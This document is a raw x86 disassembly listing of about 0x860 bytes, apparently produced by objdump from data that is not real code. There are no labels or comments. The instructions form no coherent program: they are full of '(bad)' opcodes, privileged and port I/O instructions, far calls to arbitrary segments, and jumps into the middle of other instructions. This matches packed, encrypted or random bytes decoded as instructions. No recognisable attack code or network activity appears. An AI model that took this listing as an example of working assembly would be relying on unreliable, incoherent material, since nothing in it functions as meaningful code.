  41167f:	pop    edi
  411680:	add    eax,DWORD PTR [edx-0x52]
  411683:	pusha  
  411684:	add    esi,0x60
  411687:	stos   DWORD PTR es:[edi],eax
  411688:	adc    al,0xea
  41168a:	pop    ebp
  41168b:	fcmove st,st(5)
  41168d:	xor    ebp,DWORD PTR [esp+eax*1+0xb]
  411691:	ds stos DWORD PTR es:[edi],eax
  411693:	fimul  DWORD PTR ds:0x5dddc8b3
  411699:	mov    DWORD PTR [eax+0x4b41da5],esi
  41169f:	xchg   DWORD PTR [eax+0x4],edx
  4116a2:	int3   
  4116a3:	fbld   TBYTE PTR [ebx]
  4116a5:	mov    ah,0x77
  4116a7:	fwait
  4116a8:	cmp    DWORD PTR [bp+si+0x5c84],eax
  4116ad:	in     al,dx
  4116ae:	and    bl,BYTE PTR [ebp+eiz*2-0x9]
  4116b2:	jns    0x411644
  4116b4:	add    eax,0x88438db6
  4116b9:	mov    dl,0x83
  4116bb:	pop    edi
  4116bc:	jecxz  0x4116f3
  4116be:	adc    BYTE PTR [ecx+0x3916384a],dl
  4116c4:	push   ebx
  4116c5:	lods   eax,DWORD PTR ds:[esi]
  4116c6:	adc    esp,edx
  4116c8:	or     al,0x6e
  4116ca:	pushf  
  4116cb:	and    eax,0xd22023ab
  4116d0:	pop    esi
  4116d1:	inc    edx
  4116d2:	jecxz  0x411731
  4116d4:	cli    
  4116d5:	out    0xfc,eax
  4116d7:	xchg   DWORD PTR [ebx+edx*1],esp
  4116da:	mov    edi,0x6ea63e72
  4116df:	dec    eax
  4116e0:	in     eax,dx
  4116e1:	nop
  4116e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116e3:	(bad)  
  4116e4:	xchg   esi,eax
  4116e5:	push   ebx
  4116e6:	(bad)  
  4116e8:	loope  0x411736
  4116ea:	fiadd  DWORD PTR [ebx+0x3c]
  4116ed:	or     ch,0xc1
  4116f0:	sub    bl,BYTE PTR [ecx+0x33]
  4116f3:	cmp    ebx,esi
  4116f5:	loope  0x4116d8
  4116f7:	fisttp QWORD PTR [ebx-0x18]
  4116fa:	ss ss xchg edi,eax
  4116fd:	dec    edi
  4116fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116ff:	add    edx,DWORD PTR [eax-0x1e64c94d]
  411705:	out    0x31,eax
  411707:	aam    0x34
  411709:	sti    
  41170a:	ins    DWORD PTR es:[edi],dx
  41170b:	hlt    
  41170c:	cmp    ch,BYTE PTR [ecx]
  41170e:	sub    bl,BYTE PTR [ebx+eiz*4-0x598a63e]
  411715:	out    0xc4,al
  411717:	imul   edi,DWORD PTR [ebx+0x9],0xffffffec
  41171b:	nop
  41171c:	out    0x1c,al
  41171e:	ficom  DWORD PTR [edx+0x46]
  411721:	mov    dh,0x7e
  411723:	jne    0x411756
  411725:	jl     0x411755
  411727:	mov    ecx,0x4918b502
  41172c:	mov    dh,0xe8
  41172e:	xchg   ecx,eax
  41172f:	push   ds
  411730:	in     eax,0x86
  411732:	fld    QWORD PTR [edx]
  411734:	scas   eax,DWORD PTR es:[edi]
  411735:	xchg   ecx,eax
  411736:	and    esi,esi
  411738:	dec    edi
  411739:	scas   al,BYTE PTR es:[edi]
  41173a:	popa   
  41173b:	pop    ds
  41173c:	push   edx
  41173d:	iret   
  41173e:	ins    BYTE PTR es:[edi],dx
  41173f:	mov    edi,0x10a1132
  411744:	jge    0x4117aa
  411746:	add    eax,0xdea1ae98
  41174b:	dec    ebp
  41174c:	imul   esp,DWORD PTR ds:0x18950ae3,0x7a
  411753:	add    DWORD PTR [ebx+0x3db285ce],0x2f466ee5
  41175d:	jle    0x411711
  41175f:	lods   al,BYTE PTR ds:[esi]
  411760:	pop    ebp
  411761:	sbb    dh,0x8b
  411764:	dec    ebp
  411765:	mov    ds:0x5f287ab5,eax
  41176a:	push   0xfffffff6
  41176c:	sub    dl,ah
  41176e:	jmp    0x41178d
  411770:	std    
  411771:	inc    ebp
  411772:	nop
  411773:	loop   0x411794
  411775:	mov    ?,WORD PTR [eax-0x30d19f71]
  41177b:	addr16 pop eax
  41177d:	in     eax,dx
  41177e:	mov    ds:0x352aec5b,eax
  411783:	mov    bl,0xc1
  411785:	jmp    DWORD PTR [eax]
  411787:	xchg   edx,eax
  411788:	aas    
  411789:	aam    0x6e
  41178b:	aaa    
  41178c:	xor    al,0xa
  41178e:	(bad)  
  41178f:	aad    0xa9
  411791:	in     al,dx
  411792:	cdq    
  411793:	mov    ds:0xe24f7e96,al
  411798:	stc    
  411799:	lods   al,BYTE PTR ds:[esi]
  41179a:	mov    al,ds:0x384192e4
  41179f:	cmp    bl,BYTE PTR [esi-0x2ed355f0]
  4117a5:	fs jl  0x4117fe
  4117a8:	cmp    ecx,edi
  4117aa:	or     ah,BYTE PTR [ecx+0x4006e6b9]
  4117b0:	hlt    
  4117b1:	push   eax
  4117b2:	jns    0x411822
  4117b4:	mov    ecx,ebx
  4117b6:	mov    esi,0x2a9eec24
  4117bb:	push   edi
  4117bc:	dec    ebp
  4117bd:	inc    edx
  4117be:	sbb    BYTE PTR [eax],0x81
  4117c1:	fidiv  WORD PTR [edx+ecx*4-0x3496a0d]
  4117c8:	and    eax,0xcd85ec28
  4117cd:	sbb    bh,0xd5
  4117d0:	popa   
  4117d1:	inc    edi
  4117d2:	sbb    DWORD PTR [ecx-0xc],esi
  4117d5:	lds    ecx,FWORD PTR [ebx-0x6de17ecd]
  4117db:	arpl   WORD PTR [edi+0x550d9ce0],bx
  4117e1:	sbb    bl,BYTE PTR [esi]
  4117e3:	and    ch,BYTE PTR [esi-0x47b026c1]
  4117e9:	cmp    dl,BYTE PTR [ebp-0x64e1798a]
  4117ef:	jo     0x4117db
  4117f1:	daa    
  4117f2:	adc    eax,0xf62d1a97
  4117f7:	inc    esi
  4117f8:	fdivr  DWORD PTR [ebx+0x12]
  4117fb:	dec    esi
  4117fc:	and    ebx,DWORD PTR [esp+esi*1]
  4117ff:	mov    esp,0xa6ef2c1c
  411804:	sub    bl,ah
  411806:	mov    edx,ss
  411808:	mov    cl,0x3c
  41180a:	and    al,0x38
  41180c:	cwde   
  41180d:	aad    0xfc
  41180f:	dec    esp
  411810:	rcl    ah,cl
  411812:	push   es
  411813:	push   ds
  411814:	pop    edi
  411815:	dec    ebp
  411816:	fs out 0x12,al
  411819:	sti    
  41181a:	sub    esi,DWORD PTR [edx+0x42269347]
  411820:	xchg   BYTE PTR [eax-0x787c4600],dl
  411826:	test   BYTE PTR [eax+0x4d],bh
  411829:	mov    esp,DWORD PTR [ecx-0x5d]
  41182c:	xor    bl,BYTE PTR [esi]
  41182e:	(bad)  
  41182f:	ror    DWORD PTR [edi-0x65],cl
  411832:	call   0xac12:0x92ea4c02
  411839:	imul   ecx,DWORD PTR [esi+0x1f],0x8d46798f
  411840:	ret    
  411841:	mov    ds:0x3fbe533d,eax
  411846:	pushf  
  411847:	sbb    dh,BYTE PTR [ecx-0x6956b607]
  41184d:	add    eax,0xb0fa7de7
  411852:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411853:	in     eax,dx
  411854:	adc    ebp,eax
  411856:	mov    ah,0x7b
  411858:	cdq    
  411859:	fcom   st(1)
  41185b:	sbb    eax,0xe7836272
  411860:	mov    ch,0xc7
  411862:	aam    0x68
  411864:	ret    0xf9a2
  411867:	aas    
  411868:	xchg   esp,eax
  411869:	ins    DWORD PTR es:[edi],dx
  41186a:	lea    ecx,[esi+0x6853f315]
  411870:	push   ss
  411871:	loop   0x4118a5
  411873:	jl     0x41181d
  411875:	mov    edi,0xe30bd83c
  41187a:	add    edx,edx
  41187c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41187d:	clc    
  41187e:	pop    edi
  41187f:	imul   ebp,DWORD PTR [ebx],0xffffffa9
  411882:	and    edi,DWORD PTR [esi+ebx*1+0xb]
  411886:	xchg   ebp,eax
  411887:	jle    0x411853
  411889:	mov    esp,0xf30fee4
  41188e:	xchg   edi,eax
  41188f:	cmp    al,0xda
  411891:	and    ch,BYTE PTR [edi]
  411893:	and    DWORD PTR [eax],ebx
  411895:	adc    DWORD PTR [ebp+0x9],0x7e097e9f
  41189c:	xchg   ebx,eax
  41189d:	pop    edx
  41189e:	pop    ebx
  41189f:	and    eax,DWORD PTR [edx-0x71]
  4118a2:	jmp    0x411902
  4118a4:	int3   
  4118a5:	add    BYTE PTR [eax],ah
  4118a7:	repnz dec ebx
  4118a9:	pop    ss
  4118aa:	jmp    0x4118ef
  4118ac:	icebp  
  4118ad:	jae    0x411900
  4118af:	xor    edi,esp
  4118b1:	cmp    DWORD PTR [esi],ebx
  4118b3:	mov    ebx,0xc4a18d70
  4118b8:	xor    ebx,esi
  4118ba:	mov    ebx,0xfad65a48
  4118bf:	xchg   edi,eax
  4118c0:	sahf   
  4118c1:	pushf  
  4118c2:	push   ds
  4118c3:	and    ebx,ebx
  4118c5:	call   0xa0f19cd
  4118ca:	mov    edi,0xe8d80814
  4118cf:	inc    esi
  4118d0:	xchg   edi,eax
  4118d1:	inc    eax
  4118d2:	call   0x161c:0x4e946817
  4118d9:	inc    eax
  4118da:	pop    ebp
  4118db:	or     al,0x2a
  4118dd:	(bad)  
  4118de:	or     BYTE PTR [eax+0x1dadb689],0xda
  4118e5:	aam    0xca
  4118e7:	mov    ds:0x1a08efff,eax
  4118ec:	push   esp
  4118ed:	mov    bl,0xc
  4118ef:	icebp  
  4118f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118f1:	hlt    
  4118f2:	xchg   edx,eax
  4118f3:	jne    0x411877
  4118f5:	leave  
  4118f6:	lods   eax,DWORD PTR ds:[esi]
  4118f7:	lds    edx,FWORD PTR [edi-0xfd6f1c1]
  4118fd:	mov    ah,0x1c
  4118ff:	retf   
  411900:	and    al,0x4a
  411902:	imul   ebx,DWORD PTR [ebp+0x739afb01],0x46
  411909:	pop    es
  41190a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41190b:	xchg   ecx,eax
  41190c:	dec    edi
  41190d:	sub    edx,DWORD PTR [eax]
  41190f:	pusha  
  411910:	mov    esp,0x3c495efa
  411915:	inc    esp
  411916:	jae    0x4118d1
  411918:	mov    dl,BYTE PTR [edx]
  41191a:	jo     0x41195c
  41191c:	sub    al,0xad
  41191e:	frstor [ebx-0x67fdeee6]
  411924:	cli    
  411925:	lods   al,BYTE PTR ds:[esi]
  411926:	adc    edi,DWORD PTR [ebp+ebx*2+0x19]
  41192a:	shl    BYTE PTR gs:[ecx+0x4d236116],1
  411931:	xor    dh,BYTE PTR [ebp+0x4e]
  411934:	and    esp,DWORD PTR ds:0xdc7b564b
  41193a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41193b:	jae    0x4119b0
  41193d:	les    ecx,FWORD PTR [ebx-0x32366431]
  411943:	xchg   edi,eax
  411944:	ss jns 0x411998
  411947:	pop    ss
  411948:	mov    BYTE PTR [ebx],dl
  41194a:	in     al,dx
  41194b:	test   eax,0x9143a958
  411950:	dec    ecx
  411951:	pop    es
  411952:	cmp    al,0xab
  411954:	push   ebx
  411955:	es and al,0xec
  411958:	mov    esp,0x8945741f
  41195d:	pop    ds
  41195e:	add    esp,eax
  411960:	xchg   esp,eax
  411961:	xor    DWORD PTR [ecx+0x18],eax
  411964:	inc    ebp
  411965:	jl     0x411932
  411967:	push   esi
  411968:	mov    ebp,0xaa9a6e2
  41196d:	and    DWORD PTR [ebx+0x784dce5f],ebx
  411973:	sbb    eax,ecx
  411975:	push   cs
  411976:	retf   
  411977:	in     eax,0x42
  411979:	fadd   st,st(1)
  41197b:	es dec ebx
  41197d:	fwait
  41197e:	pop    ds
  41197f:	ficom  WORD PTR [eax-0x65dc28e2]
  411985:	push   ebx
  411986:	add    DWORD PTR [edx+0x66],eax
  411989:	sti    
  41198a:	adc    eax,0x7e0c92e8
  41198f:	push   es
  411990:	dec    esi
  411991:	ret    
  411992:	dec    edi
  411993:	pop    ebx
  411994:	in     eax,dx
  411995:	dec    ecx
  411996:	xchg   esp,eax
  411997:	push   es
  411998:	inc    ebx
  411999:	mov    edi,0x26aa6386
  41199e:	mov    eax,ds:0x5b6ecf6d
  4119a3:	mov    bh,ah
  4119a5:	dec    esp
  4119a6:	add    eax,0xc0f9859e
  4119ab:	pop    edi
  4119ac:	les    ebp,FWORD PTR [edi+0x2a0596bd]
  4119b2:	mov    ebx,0xfa92f1b5
  4119b7:	pop    esp
  4119b8:	imul   ecx,DWORD PTR [ebp-0x1f],0xffffffcd
  4119bc:	mov    dl,0xa
  4119be:	dec    edi
  4119bf:	dec    ebx
  4119c0:	dec    edx
  4119c1:	sub    DWORD PTR [ecx],ecx
  4119c3:	rcr    DWORD PTR es:[ecx],1
  4119c6:	(bad)  
  4119c7:	push   eax
  4119c8:	push   ebp
  4119c9:	and    BYTE PTR [edx],ch
  4119cb:	div    BYTE PTR [eax-0x5e]
  4119ce:	mov    DWORD PTR [ebx+0x5810eda6],ecx
  4119d4:	sbb    dh,BYTE PTR [ecx+0x1e]
  4119d7:	add    dh,ch
  4119d9:	pop    esp
  4119da:	sbb    eax,0x936decbb
  4119df:	out    0x43,al
  4119e1:	bound  ecx,QWORD PTR [ebx+0x16812b2]
  4119e7:	repz adc eax,0x8974e541
  4119ed:	jne    0x411991
  4119ef:	cmp    al,0x61
  4119f1:	adc    esi,edi
  4119f3:	add    ebx,ebp
  4119f5:	sub    esp,DWORD PTR [eax-0x52]
  4119f8:	enter  0xf603,0xb0
  4119fc:	mov    esi,0xa992f9a5
  411a01:	je     0x411983
  411a03:	sbb    DWORD PTR [edi-0x78],edi
  411a06:	ror    DWORD PTR [eax],1
  411a08:	dec    edi
  411a09:	or     eax,0xd294e28e
  411a0e:	imul   esi,DWORD PTR [edx],0x7ca52653
  411a14:	push   edi
  411a15:	mov    ds:0xae62814c,eax
  411a1a:	pop    ds
  411a1b:	imul   edi,DWORD PTR [eax+esi*4-0x49762393],0xdc14dbb4
  411a26:	clc    
  411a27:	add    al,0xd4
  411a29:	lds    eax,FWORD PTR [esi-0x7]
  411a2c:	mov    ecx,ds
  411a2e:	jmp    0x4119c3
  411a30:	sti    
  411a31:	mov    dh,0x34
  411a33:	add    bl,BYTE PTR [eax-0x4167f65b]
  411a39:	call   0x1c3f633d
  411a3e:	sub    eax,0x6e63b943
  411a43:	fstp   QWORD PTR cs:[esi-0x7a1ccac6]
  411a4a:	xor    ebp,0xffffff95
  411a4d:	or     eax,0xa08838b7
  411a52:	mov    edi,0x1007d06a
  411a57:	pop    eax
  411a58:	scas   al,BYTE PTR es:[edi]
  411a59:	lds    ecx,FWORD PTR [edi-0x645455fc]
  411a5f:	cmp    BYTE PTR ds:0xd3adba64,al
  411a65:	inc    edi
  411a66:	test   eax,0x52d014cd
  411a6b:	fs and al,0x79
  411a6e:	jo     0x411ab7
  411a70:	sti    
  411a71:	into   
  411a72:	je     0x411a70
  411a74:	xor    eax,0xc9241efa
  411a79:	mov    dh,0x60
  411a7b:	imul   ecx,DWORD PTR [edi+0x5058309a],0xffffffd8
  411a82:	or     dl,BYTE PTR [edi+ecx*8-0xb505942]
  411a89:	je     0x411af1
  411a8b:	in     eax,0x10
  411a8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a8e:	ins    BYTE PTR es:[edi],dx
  411a8f:	retf   0x4588
  411a92:	pop    eax
  411a93:	in     al,0xf1
  411a95:	retf   
  411a96:	cld    
  411a97:	xor    al,0xcd
  411a99:	push   cs
  411a9a:	repnz pop ebp
  411a9c:	int3   
  411a9d:	loop   0x411ad2
  411a9f:	cdq    
  411aa0:	aad    0x11
  411aa2:	out    0x94,eax
  411aa4:	cmp    eax,0xfc7682fb
  411aa9:	test   DWORD PTR [esp+ecx*1],esp
  411aac:	mov    dh,0x25
  411aae:	dec    ebp
  411aaf:	dec    esp
  411ab0:	sub    al,0x58
  411ab2:	out    dx,al
  411ab3:	ret    
  411ab4:	mov    ecx,0xd8a40bf
  411ab9:	mov    edi,gs
  411abb:	rcl    ebx,cl
  411abd:	add    eax,0x47e4a4be
  411ac2:	inc    esi
  411ac3:	push   0xffffff8b
  411ac5:	fnop   
  411ac7:	test   DWORD PTR [esp+edi*8+0x7e],0x3efad8e5
  411acf:	mov    bh,0x29
  411ad1:	shl    DWORD PTR [eax-0x2c],1
  411ad4:	or     esi,DWORD PTR [esi+0x4c]
  411ad7:	ss sti 
  411ad9:	clc    
  411ada:	pushf  
  411adb:	or     eax,0x7807eb57
  411ae0:	cmp    eax,0x46776e85
  411ae5:	jae    0x411ad5
  411ae7:	cs xchg esi,eax
  411ae9:	sub    ecx,DWORD PTR [eax]
  411aeb:	cmp    eax,0xee40068a
  411af0:	test   al,0x12
  411af2:	cld    
  411af3:	add    eax,0xba55b322
  411af8:	sbb    eax,0xee6aeac
  411afd:	shr    DWORD PTR [esi+0x1],1
  411b00:	push   edi
  411b01:	pushf  
  411b02:	or     DWORD PTR [ebx-0x7c],esi
  411b05:	adc    DWORD PTR [edi+0xd93ccaa],0x89c44c8a
  411b0f:	ins    DWORD PTR es:[edi],dx
  411b10:	call   0x84d7:0xd0362ae9
  411b17:	dec    ecx
  411b18:	jbe    0x411af4
  411b1a:	les    ecx,FWORD PTR [esi+0x5a]
  411b1d:	and    BYTE PTR [ecx+edx*4],dh
  411b20:	xlat   BYTE PTR ds:[ebx]
  411b21:	sbb    eax,ecx
  411b23:	(bad)  
  411b24:	das    
  411b25:	fnstenv [ebx+0x50]
  411b28:	sbb    esi,ecx
  411b2a:	in     eax,dx
  411b2b:	ror    BYTE PTR [ebx+0x7c3f2cbd],cl
  411b31:	pop    edx
  411b32:	mov    cl,0x47
  411b34:	mov    dh,0x32
  411b36:	pop    edi
  411b37:	mov    esi,DWORD PTR [edi]
  411b39:	lea    esp,[esi]
  411b3b:	in     al,dx
  411b3c:	aam    0x28
  411b3e:	call   0x219d:0xdf0819a
  411b45:	out    0x80,al
  411b47:	cmp    ch,BYTE PTR [ecx]
  411b49:	in     al,0xf7
  411b4b:	outs   dx,DWORD PTR ds:[esi]
  411b4c:	xchg   esi,eax
  411b4d:	cli    
  411b4e:	(bad)  
  411b4f:	shl    DWORD PTR [esi],cl
  411b51:	inc    edi
  411b52:	hlt    
  411b53:	add    eax,esi
  411b55:	jo     0x411bbf
  411b57:	xchg   ebp,eax
  411b58:	push   0x6837353e
  411b5d:	pop    ebp
  411b5e:	sahf   
  411b5f:	xchg   ecx,eax
  411b60:	sti    
  411b61:	jge    0x411b55
  411b63:	fmul   st,st(7)
  411b65:	xchg   ebx,eax
  411b66:	gs ror bh,0x94
  411b6a:	adc    esi,DWORD PTR [edi]
  411b6c:	call   0xa7a1f4ae
  411b71:	xor    ch,BYTE PTR [edx+0x4f]
  411b74:	mov    es,ecx
  411b76:	pop    es
  411b77:	jns    0x411b8c
  411b79:	retf   0xc68a
  411b7c:	out    dx,eax
  411b7d:	add    eax,0xb2f3780c
  411b82:	ja     0x411b5c
  411b84:	jae    0x411bb0
  411b86:	xchg   edi,eax
  411b88:	(bad)  
  411b89:	stos   DWORD PTR es:[edi],eax
  411b8a:	mov    esi,0x2309b47b
  411b8f:	pop    edi
  411b90:	cmp    DWORD PTR [edi-0x2c4cbbc3],ebp
  411b96:	aaa    
  411b97:	xor    ebp,DWORD PTR [eax-0x1a]
  411b9a:	mov    edi,0xdcb5b4ba
  411b9f:	or     edi,edx
  411ba1:	test   DWORD PTR [ebp-0x34],ebp
  411ba4:	adc    eax,0x5817d90e
  411ba9:	inc    esp
  411baa:	jno    0x411bec
  411bac:	xchg   edi,eax
  411bad:	retf   0x6423
  411bb0:	aas    
  411bb1:	jmp    0x7c067bf4
  411bb6:	lods   eax,DWORD PTR ds:[esi]
  411bb7:	mov    ebp,cs
  411bb9:	scas   eax,DWORD PTR es:[edi]
  411bba:	or     DWORD PTR [eax],esi
  411bbc:	ret    
  411bbd:	push   esp
  411bbe:	and    BYTE PTR [ecx+0x57e6a5a4],dh
  411bc4:	xchg   DWORD PTR [edi+edi*4],esp
  411bc7:	mov    fs,esi
  411bc9:	js     0x411b55
  411bcb:	mov    dh,0xf6
  411bcd:	or     DWORD PTR [edx+ebp*2],0x172f70e
  411bd4:	aas    
  411bd5:	lock push edx
  411bd7:	sti    
  411bd8:	hlt    
  411bd9:	mov    dh,0xd8
  411bdb:	daa    
  411bdc:	mov    ah,0x0
  411bde:	ret    0x775d
  411be1:	adc    DWORD PTR [ecx+0x642a42f3],esi
  411be7:	repz jbe 0x411c1c
  411bea:	call   0x3e9c:0x48cef041
  411bf1:	or     BYTE PTR [edx],ah
  411bf3:	push   cs
  411bf4:	xor    eax,0x5c76b22b
  411bf9:	dec    esp
  411bfa:	push   ss
  411bfb:	(bad)  
  411bfc:	and    eax,0x260639c8
  411c01:	clc    
  411c02:	dec    edx
  411c03:	push   ecx
  411c04:	xor    dh,al
  411c06:	xchg   ebx,eax
  411c07:	jmp    0x8a82f169
  411c0c:	mov    edx,0x7b911eb6
  411c11:	std    
  411c12:	jae    0x411bcd
  411c14:	aaa    
  411c15:	or     ch,BYTE PTR [edi]
  411c17:	push   ebx
  411c18:	push   esi
  411c19:	lock ins DWORD PTR es:[edi],dx
  411c1b:	or     BYTE PTR [ecx-0x74125a0d],dh
  411c21:	loopne 0x411bef
  411c23:	bound  edi,QWORD PTR [esi-0x5c9f109f]
  411c29:	mov    ds:0x1464c05e,eax
  411c2e:	or     al,0x33
  411c30:	push   ecx
  411c31:	loopne 0x411c04
  411c33:	call   0x46ed2653
  411c38:	jo     0x411bc7
  411c3a:	mov    ch,0xfb
  411c3c:	sub    DWORD PTR [edi],esp
  411c3e:	mov    ch,0x57
  411c40:	adc    dh,BYTE PTR [edx-0xa995a41]
  411c46:	sti    
  411c47:	dec    ebp
  411c48:	push   cs
  411c49:	out    0x7d,al
  411c4b:	mov    eax,ds:0x4db67f71
  411c50:	mov    bh,0x9
  411c52:	mov    fs,WORD PTR [ebx+0x33]
  411c55:	adc    eax,0x84eab19a
  411c5a:	dec    ebp
  411c5b:	pushf  
  411c5c:	dec    ebp
  411c5d:	sbb    DWORD PTR [esi-0x5c1397f0],ebp
  411c63:	loope  0x411c59
  411c65:	data16 mov ah,0xe8
  411c68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c69:	loop   0x411c62
  411c6b:	ins    DWORD PTR es:[edi],dx
  411c6c:	in     al,0x41
  411c6e:	jp     0x411c96
  411c70:	jne    0x411c9e
  411c72:	fcmovb st,st(2)
  411c74:	mov    edi,0xe362f141
  411c79:	scas   eax,DWORD PTR es:[edi]
  411c7a:	add    BYTE PTR [edi-0x3521ec78],0x9
  411c81:	iret   
  411c82:	push   ecx
  411c83:	pop    es
  411c84:	xor    BYTE PTR [ebx+esi*2+0x53],cl
  411c88:	dec    esi
  411c89:	push   edi
  411c8a:	or     DWORD PTR [esi],esi
  411c8c:	mov    edi,ss
  411c8e:	and    eax,0x240ec661
  411c93:	call   0x0:0x648ffa3a
	...
  411d12:	add    BYTE PTR [eax],al
  411d14:	sub    DWORD PTR [edx+0x41],ebx
  411d17:	sbb    dh,BYTE PTR [ebx+0x1b]
  411d1a:	jnp    0x411d97
  411d1c:	retf   0x5bc8
  411d1f:	nop
  411d20:	int    0xc6
  411d22:	push   ecx
  411d23:	test   BYTE PTR [ecx+0x6c0000c6],ch
  411d29:	pop    es
  411d2a:	add    BYTE PTR [eax],al
  411d2c:	dec    ebx
  411d2d:	(bad)  
  411d2e:	mov    BYTE PTR [ecx-0x536e47c1],ch
  411d34:	ja     0x411ceb
  411d36:	mov    ebx,0x3c88684a
  411d3b:	loopne 0x411d38
  411d3d:	push   esp
  411d3e:	jge    0x411d04
  411d40:	rcr    ecx,1
  411d42:	dec    ebx
  411d43:	dec    ebx
  411d44:	dec    ebx
  411d45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d46:	inc    ebp
  411d47:	xor    ecx,DWORD PTR [edx]
  411d49:	push   ecx
  411d4a:	cmp    eax,0x6f9dc4f5
  411d4f:	xor    al,0xb3
  411d51:	sbb    edi,DWORD PTR [eax+0x13]
  411d54:	int    0x3c
  411d56:	pushw  ss
  411d58:	xchg   esi,eax
  411d59:	cmc    
  411d5a:	sub    cl,cl
  411d5c:	sub    BYTE PTR [eax],dl
  411d5e:	mov    esp,0x4438c63b
  411d63:	xor    DWORD PTR [eax-0x76f2ba21],edi
  411d69:	hlt    
  411d6a:	mov    esp,0x53765344
  411d6f:	shr    DWORD PTR [eax+0x3e],cl
  411d72:	out    0xd0,al
  411d74:	pop    edx
  411d75:	inc    esp
  411d76:	rol    BYTE PTR [eax-0x32],0x28
  411d7a:	xchg   al,ah
  411d7c:	out    0x77,eax
  411d7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d7f:	pop    ds
  411d80:	stc    
  411d81:	and    al,0x5b
  411d83:	(bad)  
  411d84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d85:	mov    edi,0x56905e73
  411d8a:	jb     0x411dfc
  411d8c:	mov    eax,ds:0xaaa4b6af
  411d91:	scas   eax,DWORD PTR es:[edi]
  411d92:	in     al,0xfe
  411d94:	mov    edi,0xee5f248c
  411d99:	rcr    BYTE PTR [ebp-0x6b88742a],cl
  411d9f:	in     eax,dx
  411da0:	xor    dh,ch
  411da2:	in     al,dx
  411da3:	sbb    eax,0xc5aa5153
  411da8:	fs repnz data16 es in al,0x99
  411dae:	gs addr16 xor al,0x45
  411db2:	mov    ?,WORD PTR [edx]
  411db4:	mov    ds:0xe62827e2,al
  411db9:	das    
  411dba:	mov    eax,0x1a654361
  411dbf:	cmp    eax,0xd9ddc403
  411dc4:	xchg   DWORD PTR [edi+0x43f0694c],ebp
  411dca:	mov    BYTE PTR ds:0x6d62fda,bh
  411dd0:	ja     0x411de2
  411dd2:	xchg   ebx,eax
  411dd3:	xor    cl,BYTE PTR [ebx]
  411dd5:	jle    0x411e0a
  411dd7:	push   esi
  411dd8:	hlt    
  411dd9:	mov    ds:0x99f4a2af,eax
  411dde:	int    0x9c
  411de0:	in     al,dx
  411de1:	xchg   edi,eax
  411de3:	fisttp DWORD PTR [eax]
  411de5:	jns    0x411d76
  411de7:	hlt    
  411de8:	jmp    0x14dd:0xeda33461
  411def:	aas    
  411df0:	mov    al,0x58
  411df2:	jmp    0xcd52:0x7c824aef
  411df9:	inc    ebp
  411dfa:	outs   dx,DWORD PTR ds:[esi]
  411dfb:	mov    ebx,0xc8206659
  411e00:	(bad)  
  411e01:	rcl    BYTE PTR [ebp-0x24f16621],1
  411e07:	add    al,0x92
  411e09:	stos   BYTE PTR es:[edi],al
  411e0a:	jge    0x411dae
  411e0c:	mov    al,0xca
  411e0e:	and    dh,dh
  411e10:	xor    DWORD PTR [edx-0x6e561416],edx
  411e16:	sti    
  411e17:	call   0xc570:0x4322c657
  411e1e:	shl    BYTE PTR [esi+0x6a],0xda
  411e22:	mov    edx,0x2abe9e11
  411e27:	or     eax,ecx
  411e29:	cmp    eax,0x3a8be897
  411e2e:	inc    esp
  411e2f:	(bad)  
  411e30:	mov    ecx,0xf1efebda
  411e35:	add    al,dh
  411e37:	mov    esp,DWORD PTR [esi+ebp*2+0x44]
  411e3b:	mov    ebp,0x7174719e
  411e40:	adc    ebp,DWORD PTR [ebx-0x30]
  411e43:	lea    ebp,[ecx]
  411e45:	adc    ah,BYTE PTR [esi]
  411e47:	loop   0x411e3c
  411e49:	pop    ss
  411e4a:	adc    DWORD PTR [esi-0x35],0x70a64686
  411e51:	fnstsw WORD PTR [ecx]
  411e53:	jno    0x411e9f
  411e55:	sbb    ah,bh
  411e57:	leave  
  411e58:	call   0x5390e3ce
  411e5d:	lock cmp ecx,ebp
  411e60:	hlt    
  411e61:	call   0xa87e:0xf0cc015
  411e68:	mov    ecx,0xa3a96a3d
  411e6d:	aam    0xef
  411e6f:	add    ch,0x3b
  411e72:	es inc eax
  411e74:	pop    edx
  411e75:	arpl   WORD PTR [ecx],di
  411e77:	cld    
  411e78:	mov    ?,edx
  411e7a:	sahf   
  411e7b:	pop    eax
  411e7c:	iret   
  411e7d:	and    eax,0x18274ae
  411e82:	aam    0x61
  411e84:	test   ebx,0xb2f1e688
  411e8a:	jns    0x411e57
  411e8c:	js     0x411eeb
  411e8e:	push   ss
  411e8f:	cld    
  411e90:	ins    BYTE PTR es:[edi],dx
  411e91:	xlat   BYTE PTR ds:[ebx]
  411e92:	(bad)  
  411e93:	and    eax,0x4cec6f20
  411e98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e99:	fdiv   DWORD PTR [edx+0x50064a89]
  411e9f:	mov    ds:0xca4e82,eax
  411ea4:	and    edx,esp
  411ea6:	cmp    al,0x8c
  411ea8:	add    DWORD PTR [eax-0x18],esi
  411eab:	rcr    ebx,1
  411ead:	push   cs
  411eae:	jno    0x411e6b
  411eb0:	jg     0x411eef
  411eb2:	dec    esp
  411eb3:	dec    esp
  411eb4:	fsub   DWORD PTR [esi+0x325b95b8]
  411eba:	jne    0x411e69
  411ebc:	or     eax,0x2b4640b6
  411ec1:	push   0xe486eb95
  411ec6:	fst    st(2)
  411ec8:	shl    BYTE PTR [ecx],0xd1
  411ecb:	mov    dl,0xbc
  411ecd:	(bad)  
  411ece:	mov    DWORD PTR [ebp-0xe],ebx
  411ed1:	dec    ebp
  411ed2:	jmp    0x411e5c
  411ed4:	dec    ebp
  411ed5:	pop    ebp
  411ed6:	mov    cl,BYTE PTR [ecx+0x70a3c65a]
  411edc:	sbb    ebx,DWORD PTR [eax-0x48]
  411edf:	clc    
  411ee0:	and    DWORD PTR [esi-0x63],ebx
  411ee3:	push   eax
